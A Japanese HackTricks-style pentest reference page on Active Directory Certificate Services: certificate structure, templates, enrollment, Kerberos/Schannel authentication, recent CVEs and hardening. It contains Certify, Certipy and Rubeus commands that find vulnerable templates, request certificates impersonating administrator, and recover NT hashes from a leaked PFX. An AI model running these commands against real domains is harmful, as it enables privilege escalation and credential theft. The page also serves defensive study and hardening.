# AD Certificates

{{#include ../../banners/hacktricks-training.md}}

## はじめに

### 証明書の構成要素

- 証明書の **Subject** は、その所有者を示します。
- **Public Key** は、秘密に保持された鍵とペアになり、証明書と正当な所有者を結び付けます。
- **NotBefore** と **NotAfter** の日付で定義される **Validity Period** は、証明書が有効な期間を示します。
- Certificate Authority (CA) によって割り当てられる一意の **Serial Number** は、各証明書を識別します。
- **Issuer** は、証明書を発行した CA を示します。
- **SubjectAlternativeName** により、Subject に追加の名前を指定でき、識別の柔軟性が高まります。
- **Basic Constraints** は、証明書が CA 用かエンドエンティティ用かを示し、使用制限を定義します。
- **Extended Key Usages (EKUs)** は、Object Identifiers (OIDs) を通じて、コード署名やメール暗号化など、証明書の具体的な用途を定めます。
- **Signature Algorithm** は、証明書への署名に使用する方式を指定します。
- 発行者の秘密鍵で作成される **Signature** は、証明書の真正性を保証します。<sup>[[4]](#references)</sup>

### 特別な考慮事項

- **Subject Alternative Names (SANs)** により、証明書を複数のIDに適用できるため、複数のドメインを持つサーバーで重要です。攻撃者が SAN の指定を操作してなりすますリスクを避けるには、安全な発行プロセスが不可欠です。<sup>[[4]](#references)</sup>

### Active Directory (AD) の Certificate Authorities (CAs)

AD CS は、AD フォレスト内の CA 証明書を、固有の役割を持つ指定コンテナーを通じて管理します。<sup>[[4]](#references)</sup>

- **Certification Authorities** コンテナーには、信頼されたルート CA 証明書が格納されます。
- **Enrolment Services** コンテナーには、Enterprise CA とその証明書テンプレートの情報が含まれます。
- **NTAuthCertificates** オブジェクトには、AD 認証で使用を許可された CA 証明書が含まれます。
- **AIA (Authority Information Access)** コンテナーは、中間 CA 証明書やクロス CA 証明書を使用した証明書チェーンの検証を可能にします。

### 証明書の取得: クライアント証明書要求のフロー

1. クライアントが Enterprise CA を見つけるところから要求プロセスが始まります。
2. 公開鍵とその他の情報を含む CSR を、公開鍵と秘密鍵のペアを生成した後に作成します。
3. CA は、利用可能な証明書テンプレートに照らして CSR を評価し、テンプレートの権限に基づいて証明書を発行します。
4. 承認されると、CA は秘密鍵で証明書に署名し、クライアントに返します。<sup>[[4]](#references)</sup>

### 証明書テンプレート

AD 内で定義されるこれらのテンプレートは、証明書の発行に関する設定と権限を定めます。許可される EKU や登録・変更権限などが含まれ、証明書サービスへのアクセス管理に不可欠です。<sup>[[4]](#references)</sup>

**テンプレートのスキーマ バージョンは重要です。** レガシーな **v1** テンプレート（組み込みの **WebServer** テンプレートなど）には、最新の強制設定がいくつかありません。**ESC15/EKUwu** の研究により、**v1 テンプレート**では、要求者が CSR に埋め込んだ **Application Policies/EKUs** がテンプレートに設定された EKU よりも**優先される**ことが示されました。これにより、登録権限だけで client-auth、enrollment agent、または code-signing 証明書を取得できます。**v2/v3 テンプレート**を優先し、v1 の既定値を削除または置き換え、EKU の範囲を意図した用途に厳密に限定してください。<sup>[[1]](#references)</sup>

## 証明書の登録

証明書の登録プロセスは、管理者が**証明書テンプレートを作成**し、それを Enterprise Certificate Authority (CA) が**公開**することで開始されます。これにより、クライアントがテンプレートを使って登録できるようになります。この手順は、Active Directory オブジェクトの `certificatetemplates` フィールドにテンプレート名を追加することで行われます。<sup>[[4]](#references)</sup>

クライアントが証明書を要求するには、**登録権限**が付与されている必要があります。これらの権限は、証明書テンプレートと Enterprise CA 自体のセキュリティ記述子で定義されます。要求を成功させるには、両方の場所で権限を付与する必要があります。<sup>[[4]](#references)</sup>

### テンプレートの登録権限

これらの権限は Access Control Entry (ACE) で指定され、次のような許可が含まれます。<sup>[[4]](#references)</sup>

- **Certificate-Enrollment** と **Certificate-AutoEnrollment** の権限。それぞれ固有の GUID に関連付けられています。
- **ExtendedRights**。すべての拡張権限を許可します。
- **FullControl/GenericAll**。テンプレートに対する完全な制御を許可します。

### Enterprise CA の登録権限

CA の権限は、そのセキュリティ記述子で定義されており、Certificate Authority 管理コンソールから確認できます。一部の設定では、低権限ユーザーにリモートアクセスを許可することもでき、セキュリティ上の懸念となる可能性があります。<sup>[[4]](#references)</sup>

### その他の発行制御

次のような制御が適用される場合があります。<sup>[[4]](#references)</sup>

- **Manager Approval**: 証明書マネージャーが承認するまで、要求を保留状態にします。
- **Enrolment Agents and Authorized Signatures**: CSR に必要な署名数と、必要な Application Policy OID を指定します。

### 証明書を要求する方法

証明書は、次の方法で要求できます。<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE)。DCOM インターフェースを使用します。
2. **ICertPassage Remote Protocol** (MS-ICPR)。名前付きパイプまたは TCP/IP を使用します。
3. **certificate enrollment web interface**。Certificate Authority Web Enrollment ロールがインストールされている場合に利用できます。
4. **Certificate Enrollment Service** (CES)。Certificate Enrollment Policy (CEP) サービスと組み合わせて使用します。
5. ネットワークデバイス向けの **Network Device Enrollment Service** (NDES)。Simple Certificate Enrollment Protocol (SCEP) を使用します。

Windows ユーザーは、GUI（`certmgr.msc` または `certlm.msc`）やコマンドラインツール（`certreq.exe` または PowerShell の `Get-Certificate` コマンド）からも証明書を要求できます。

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Certificate Authentication

Active Directory (AD) は、主に **Kerberos** および **Secure Channel (Schannel)** プロトコルを利用した証明書認証をサポートしています。<sup>[[4]](#references)</sup>

### Kerberos Authentication Process

Kerberos 認証プロセスでは、ユーザーの Ticket Granting Ticket (TGT) のリクエストは、ユーザーの証明書の **private key** を使用して署名されます。このリクエストは、証明書の **有効性**、**パス**、**失効状態**など、ドメインコントローラーによる複数の検証を受けます。また、証明書が信頼できるソースから発行されたことや、発行者が **NTAUTH certificate store** に存在することも確認されます。検証に成功すると、TGT が発行されます。AD の **`NTAuthCertificates`** オブジェクトは、次の場所にあります：

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

証明書認証の信頼を確立するうえで中心的な役割を果たします。<sup>[[4]](#references)</sup>

**KB5014754** の展開以降、最新の Kerberos 証明書認証では、EKU だけでなく、主に **マッピングの強度**が重要になっています。<sup>[[2]](#references)</sup> 強化されたフォレストでは、次の点に注意が必要です。

- **UPN/DNS SAN** だけを含む証明書では、ログオンできなくなる場合があります。
- KDC は、通常 **SID セキュリティ拡張**（`1.3.6.1.4.1.311.25.2`）または `altSecurityIdentities` 内の強力な明示的マッピングによる **強いバインディング**を優先します。
- 証明書に強いマッピングがない場合、DC は互換モードでは **Kdcsvc Event ID 39/41** を記録し、強制モードでは認証を拒否します。
- 複数の攻撃経路を組み合わせる場合、発行される証明書から SID 拡張を取り除く **ESC9/ESC16** が重要になります。その場合、攻撃経路が対応していれば、実行者は明示的マッピングや SAN URL の SID 形式に頼ります。

### Secure Channel (Schannel) Authentication

Schannel は安全な TLS/SSL 接続を実現します。ハンドシェイク中にクライアントが証明書を提示し、その検証に成功するとアクセスが許可されます。<sup>[[5]](#references)</sup> 証明書を AD アカウントにマッピングする方法には、Kerberos の **S4U2Self** 関数や証明書の **Subject Alternative Name (SAN)** などがあります。<sup>[[4]](#references)</sup>

**PKINIT** が利用できない場合、Schannel は実用的な代替手段にもなります。たとえば、ドメインコントローラーに適切な **Smart Card Logon** 証明書がない場合、`certipy auth`/PKINIT ツールでは TGT の取得に失敗することがあります。しかし、同じ証明書を **LDAPS** または **LDAP StartTLS** での認証や LDAP 操作に利用できる場合があります。

### AD Certificate Services Enumeration

AD の証明書サービスは LDAP クエリで列挙でき、**Enterprise Certificate Authorities (CAs)** とその構成に関する情報を明らかにできます。これは、特別な権限を持たないドメイン認証済みユーザーでも利用できます。<sup>[[4]](#references)</sup> **[Certify](https://github.com/GhostPack/Certify)** や **[Certipy](https://github.com/ly4k/Certipy)** などのツールは、AD CS 環境の列挙と脆弱性評価に使用されます。<sup>[[6]](#references)</sup>

これらのツールを使用するコマンドは次のとおりです。

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Rubeus による Certify の列挙フラグと PKINIT

以下の Certify コマンドのバリエーションは、それぞれ異なるフィルターと出力オプションを維持します。<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeusは、パスワードで保護されたPFX証明書をPKINIT認証に使用して、TGTを要求することもできます。オプションの`/getcredentials`スイッチはU2Uサービスチケットを要求し、アカウントのNT hashの復元を試みます。<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

ESC固有の template と CA の悪用については、[AD CS Domain Escalation](ad-certificates/domain-escalation.md) を参照してください。

---

## 最近の脆弱性とセキュリティ更新 (2022-2025)

| 年 | ID / 名前 | 影響 | 主なポイント |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | PKINIT 中にマシンアカウントの証明書をスプーフィングすることによる *権限昇格*。 | 修正プログラムは **2022年5月10日** のセキュリティ更新に含まれています。監査と強力なマッピングの制御は **KB5014754** で導入されました。現在、環境は *Full Enforcement* モードである必要があります。 |
| 2023 | **CVE-2023-35350 / 35351** | AD CS Web Enrollment (certsrv) および CES ロールにおける *リモートコード実行*。 | 公開 PoC は限られていますが、脆弱な IIS コンポーネントが内部ネットワークに公開されていることはよくあります。**2023年7月** の Patch Tuesday の更新を適用してください。 |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | **v1 テンプレート**では、登録権限を持つ要求者が CSR に **Application Policies/EKUs** を埋め込むと、テンプレートの EKU より優先され、クライアント認証、登録エージェント、またはコード署名用の証明書を発行できます。 | **2024年11月12日** 時点で修正済みです。v1 テンプレート (既定の WebServer など) を置き換えるか、後継テンプレートを作成し、EKU を用途に合わせて制限し、登録権限を制限してください。 |

### Microsoft の強化タイムライン (KB5014754)

Microsoft は、Kerberos 証明書認証を弱い暗黙的マッピングから移行するため、3 段階のロールアウト (Compatibility → Audit → Enforcement) を導入しました。**2025年2月11日** 時点で、`StrongCertificateBindingEnforcement` レジストリ値が設定されていない場合、ドメインコントローラーは自動的に **Full Enforcement** に切り替わります。その後 Microsoft はタイムラインを更新し、**2025年9月9日** のセキュリティ更新まで互換モードへのフォールバックを可能にしました。<sup>[[2]](#references)</sup> 管理者は次の対応を行ってください。

1. すべての DC と AD CS サーバーに (2022年5月以降の) 更新を適用する。
2. *Audit* フェーズ中に Event ID 39/41 を監視し、弱いマッピングを検出する。
3. 強制モードで弱いマッピングがブロックされる前に、新しい **SID extension** を含むクライアント認証証明書を再発行するか、強力な手動マッピングを設定する。

### 強化されたフォレストでのオペレーター向け注意事項

- **2025年以降の環境では、ESC1/ESC6 だけがすべてではありません**。別のプリンシパルの証明書を要求する場合、通常は SID extension や明示的なマッピングなどの強力なマッピング要素も必要です。
- **ESC15 (EKUwu)** は主に未修正環境で有効です。**Application Policies** を注入することで、**WebServer** のような無害な **v1** テンプレートを、認証や登録エージェントに利用できる証明書に変えます。Kerberos PKINIT は引き続き EKU を評価しますが、**LDAP Schannel** も Application Policies を考慮するため、LDAP ベースの悪用は依然として有効です。<sup>[[1]](#references)</sup>
- **ESC16** は CA 全体に適用される設定です。CA が SID security extension を全体的に無効化すると、攻撃チェーンが別のサポート対象形式で SID を注入しない限り、発行されるすべての証明書が弱いマッピング動作に戻ります。
- **ESC7 の権限は別々です。** CA の `ManageCA` 権限があれば、`EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) などの設定を変更できる場合があります。一方、`ManageCertificates` は要求の承認を制御します。証明書マネージャー権限への明示的な Deny は、Allow も存在する場合でも承認経路をブロックできます。設定とテンプレートを組み合わせる前に、実効 CA ACL を評価してください。[Microsoft による CA ACL の評価](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting) を参照してください。

---

## 検出と強化に関する改善

* **Defender for Identity AD CS sensor (2023-2024)** は、ESC1-ESC8/ESC11 のセキュリティ態勢評価を表示し、*「非 DC に対するドメインコントローラー証明書の発行」* (ESC8) や *「任意の Application Policies による証明書登録を防止」* (ESC15) などのリアルタイムアラートを生成するようになりました。これらの検出を利用できるよう、すべての AD CS サーバーにセンサーを展開してください。<sup>[[3]](#references)</sup>
* すべてのテンプレートで **“Supply in the request”** オプションを無効にするか、厳密に制限してください。SAN/EKU は明示的に定義することを推奨します。
* 絶対に必要な場合を除き、テンプレートから **Any Purpose** または **No EKU** を削除してください (ESC2 の状況に対処できます)。
* 機密性の高いテンプレート (WebServer / CodeSigning など) には、**manager approval** または専用の Enrollment Agent ワークフローを必須にしてください。
* Web enrollment (`certsrv`) と CES/NDES エンドポイントへのアクセスを信頼できるネットワークに制限するか、クライアント証明書認証の背後に配置してください。
* ESC11 (RPC relay) を軽減するため、RPC 登録の暗号化を強制してください (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`)。このフラグは**既定で有効**ですが、レガシークライアントに対応するため無効化されていることが多く、その場合 relay のリスクが再び生じます。
* **IIS ベースの登録エンドポイント** (CES/Certsrv) を保護してください。可能であれば NTLM を無効化するか、ESC8 relay を防ぐため HTTPS と Extended Protection を必須にします。

ESC11 は CA が実行されているホストで評価してください。そのホストはドメインコントローラーではなく、ドメインメンバーサーバーの場合があります。アクティブな CA の `InterfaceFlags` を `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` で確認してください。値を読み取れない場合や存在しない場合は不明であり、RPC 暗号化が無効である証拠にはなりません。`IF_ENFORCEENCRYPTICERTREQUEST` ビットがクリアされている場合は設定上の手掛かりになりますが、実際に悪用するには、到達可能な登録 RPC エンドポイント、認証情報を強制可能な手段、および利用可能な証明書テンプレートも必要です。ESC8 では、HTTP NTLM challenge だけでは不十分です。利用可能な登録エンドポイントが存在することを確認してください。

---

## References

- [1] [EKUwu: ただの別の AD CS ESC ではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Windows ドメインコントローラーにおける証明書ベース認証の変更](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [証明書のセキュリティ態勢評価 - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Active Directory Certificate Services の悪用](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [SSL/TLS クライアント認証とは何か、どのように機能するのか？](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
